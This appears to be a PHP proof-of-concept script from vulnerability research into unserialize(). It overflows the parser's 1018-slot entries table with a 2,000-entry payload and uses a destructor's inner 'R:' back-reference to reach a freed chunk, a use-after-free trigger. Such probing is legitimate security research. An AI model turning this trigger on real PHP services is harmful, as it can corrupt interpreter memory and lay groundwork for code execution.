<?php
// V7: outer overflows VAR_ENTRIES_MAX=1018 to allocate extension chunks.
// __destruct uses inner unserialize to do an R: back-reference that should
// resolve into an entries chunk freed by outer's var_destroy phase 1.

class A {
    public function __destruct() {
        fwrite(STDERR, "[A::__destruct] inner R: backref\n");
        // R:N references the Nth value parsed (1-indexed). Pick a slot
        // that lived in an extension chunk (slot > 1018).
        // Need to know the slot id of A in the entries chain — it's the
        // last value before the dup-key second value. We parsed 1500
        // primitive entries first (slots ~1..1500), then the array (1?),
        // then the values... this is fuzzy. Pick something deep in the
        // freed range. R:1500 should resolve to a slot in the freed first
        // extension chunk.
        $r = @unserialize('R:1500;');
        fwrite(STDERR, "[A::__destruct] inner result type=" . gettype($r) . "\n");
        if (is_array($r) || is_object($r)) {
            fwrite(STDERR, "  raw inspect: " . substr(@serialize($r), 0, 80) . "\n");
        } else {
            fwrite(STDERR, "  value=" . var_export($r, true) . "\n");
        }
    }
}

// Outer: 2000 entries to ensure overflow well past VAR_ENTRIES_MAX=1018.
$N = 2000;
$payload = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) {
    $payload .= "i:$i;i:$i;";
}
$payload .= 'i:99999;O:1:"A":0:{}';
$payload .= 'i:99999;i:42;';
$payload .= '}';

fwrite(STDERR, "[main] outer call (payload " . strlen($payload) . " bytes)\n");
$r = @unserialize($payload);
fwrite(STDERR, "[main] outer returned\n");
$r = null;
fwrite(STDERR, "[main] done\n");
